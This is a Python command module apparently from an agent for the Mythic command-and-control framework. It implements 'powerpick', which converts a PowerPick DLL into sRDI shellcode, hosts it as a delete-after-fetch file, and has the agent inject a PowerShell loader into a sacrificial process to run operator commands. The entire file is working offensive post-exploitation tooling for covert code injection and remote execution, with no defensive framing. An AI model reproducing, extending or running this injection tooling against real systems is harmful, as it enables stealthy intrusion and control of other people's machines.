from mythic_payloadtype_container.MythicCommandBase import *
import json
from sRDI import ShellcodeRDI
from uuid import uuid4
from mythic_payloadtype_container.MythicRPC import *
from os import path

class PowerpickArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "powershell_params": CommandParameter(name="Command", type=ParameterType.String, description="PowerShell command to execute.", required=True),
        }

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("A command must be passed on the command line to PowerPick.\n\tUsage: {}".format(PowerpickCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("powershell_params", self.command_line)
        self.add_arg("pipe_name", str(uuid4()))
        pass


class PowerpickCommand(CommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = "powerpick [command]"
    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PowerpickArguments
    attackmapping = []
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"PowerPick_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
        resp = await MythicRPC().execute("create_file",
                                         file=base64.b64encode(converted_dll).decode(),
                                         task_id=task.id,
                                         delete_after_fetch=True)
        if resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
        else:
            raise Exception(f"Failed to host sRDI loader stub: {resp.error}")
        task.display_params = task.args.get_arg("powershell_params")
        return task

    async def process_response(self, response: AgentResponse):
        pass
